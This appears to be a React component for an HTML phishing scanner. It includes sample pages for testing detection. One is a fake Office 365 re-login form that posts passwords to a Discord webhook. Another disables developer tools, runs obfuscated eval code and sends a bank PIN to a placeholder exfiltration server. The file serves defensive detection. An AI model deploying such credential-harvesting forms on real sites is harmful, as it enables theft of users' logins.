import React, { useState } from 'react';
import { Code, RefreshCw, Shield, Sparkles, ArrowRight } from 'lucide-react';
import { analyzeHtml } from '../../services/htmlAnalyzer';
import { ScanResults } from './ScanResults';
import { playScanSweep, playSafePing, playWarningBlip, playDangerAlert } from '../../utils/audioEffects';

const SAMPLE_HTML = [
  {
    label: 'Discord Webhook Credential Harvester',
    desc: 'Form action directly exfiltrating passwords to Discord webhook',
    code: `<!DOCTYPE html>
<html>
<head><title>Microsoft Account Verification</title></head>
<body>
  <h2>Session Expired - Re-enter Password</h2>
  <form action="https://discord.com/api/webhooks/1209381029381/tokenXYZ" method="POST">
    <input type="text" name="email" placeholder="Corporate Email" required />
    <input type="password" name="password" placeholder="Office 365 Password" required />
    <button type="submit">Verify Identity</button>
  </form>
</body>
</html>`
  },
  {
    label: 'Obfuscated JS & Anti-DevTools Script',
    desc: 'eval(unescape(...)) payload with F12 and right-click disabling',
    code: `<!DOCTYPE html>
<html>
<head>
  <script>
    document.oncontextmenu = function() { return false; };
    document.onkeydown = function(e) { if(e.keyCode == 123) return false; };
    eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%68%31%3e%50%61%79%50%61%6c%20%4c%6f%67%69%6e%3c%2f%68%31%3e%27%29%3b'));
  </script>
</head>
<body>
  <div style="font-size:0px; opacity:0">Security clean verified genuine token</div>
  <form action="http://insecure-exfil-server.xyz/steal.php" method="POST">
    <input type="password" name="pin" placeholder="Enter Bank PIN" />
  </form>
</body>
</html>`
  },
  {
    label: 'Clean HTML5 Authentication Page',
    desc: 'Secure HTTPS POST endpoint with standard DOM',
    code: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Enterprise Single Sign-On</title>
</head>
<body>
  <div class="auth-box">
    <h1>Sign In to Corporate Portal</h1>
    <form action="https://auth.company.com/oauth/authorize" method="POST">
      <input type="email" name="user" required />
      <input type="password" name="pass" required />
      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>`
  }
];

export const HtmlScanner = ({ onScanComplete, onOpenAbuse }) => {
  const [htmlInput, setHtmlInput] = useState('');
  const [scanning, setScanning] = useState(false);
  const [currentResult, setCurrentResult] = useState(null);

  const handleScan = (codeToScan) => {
    const code = (codeToScan !== undefined ? codeToScan : htmlInput).trim();
    if (!code) return;

    setScanning(true);
    playScanSweep();

    setTimeout(() => {
      const result = analyzeHtml(code);
      setCurrentResult(result);
      setScanning(false);

      if (result.threatLevel === 'malicious') playDangerAlert();
      else if (result.threatLevel === 'suspicious') playWarningBlip();
      else playSafePing();

      if (onScanComplete) onScanComplete(result);
    }, 600);
  };

  const handleLoadSample = (sampleCode) => {
    setHtmlInput(sampleCode);
    handleScan(sampleCode);
  };

  const handleClear = () => {
    setHtmlInput('');
    setCurrentResult(null);
  };

  return (
    <div className="space-y-6">
      <div className="relative bg-slate-900/90 border border-cyan-900/50 rounded-2xl p-6 shadow-2xl backdrop-blur-md overflow-hidden">
        {scanning && <div className="scanline" />}

        <div className="flex items-center space-x-3 mb-4">
          <div className="p-2 rounded-lg bg-cyan-950 border border-cyan-800 text-cyan-400">
            <Code className="w-5 h-5" />
          </div>
          <div>
            <h2 className="text-lg font-bold text-white tracking-wide">
              HTML DOM & Source Code Inspector
            </h2>
            <p className="text-xs text-slate-400">
              Detect credential exfiltration webhooks, obfuscated JS packers, anti-devtools scripts, and hidden password traps
            </p>
          </div>
        </div>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            handleScan();
          }}
          className="space-y-4"
        >
          <textarea
            rows={8}
            value={htmlInput}
            onChange={(e) => setHtmlInput(e.target.value)}
            placeholder="Paste HTML source code, form elements, or script tags here..."
            className="w-full p-4 bg-slate-950 border border-slate-800 focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 rounded-xl text-slate-100 placeholder-slate-500 text-xs font-mono transition-all outline-none resize-y"
          />

          <div className="flex items-center justify-between gap-3">
            <div className="text-xs text-slate-500 font-mono">
              Inspects &lt;form action&gt; destinations, script obfuscation, and zero-font text
            </div>

            <div className="flex items-center gap-2">
              {htmlInput && (
                <button
                  type="button"
                  onClick={handleClear}
                  className="px-4 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-medium transition-colors"
                >
                  Clear
                </button>
              )}

              <button
                type="submit"
                disabled={scanning || !htmlInput.trim()}
                className="flex items-center space-x-2 px-6 py-2.5 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 disabled:opacity-50 text-white font-bold text-xs shadow-lg shadow-cyan-500/20 transition-all cursor-pointer"
              >
                {scanning ? (
                  <>
                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                    <span>Analyzing DOM & Scripts...</span>
                  </>
                ) : (
                  <>
                    <Shield className="w-3.5 h-3.5" />
                    <span>Inspect HTML Security</span>
                  </>
                )}
              </button>
            </div>
          </div>
        </form>

        <div className="mt-5 pt-4 border-t border-slate-800/80">
          <div className="flex items-center space-x-2 text-xs font-semibold text-slate-400 mb-2.5">
            <Sparkles className="w-3.5 h-3.5 text-cyan-400" />
            <span>Load Real Phishing Kit Source Signatures:</span>
          </div>

          <div className="flex flex-wrap gap-2">
            {SAMPLE_HTML.map((sample, idx) => (
              <button
                key={idx}
                type="button"
                onClick={() => handleLoadSample(sample.code)}
                className="flex items-center space-x-1.5 px-3 py-1.5 rounded-lg bg-slate-950/80 hover:bg-slate-800 text-slate-300 text-xs border border-slate-800 hover:border-cyan-800/60 transition-all text-left"
                title={sample.desc}
              >
                <span className="w-1.5 h-1.5 rounded-full bg-cyan-400"></span>
                <span className="font-medium text-slate-200">{sample.label}</span>
                <ArrowRight className="w-3 h-3 text-slate-500" />
              </button>
            ))}
          </div>
        </div>
      </div>

      {currentResult && (
        <ScanResults
          result={currentResult}
          onOpenAbuse={onOpenAbuse}
        />
      )}
    </div>
  );
};
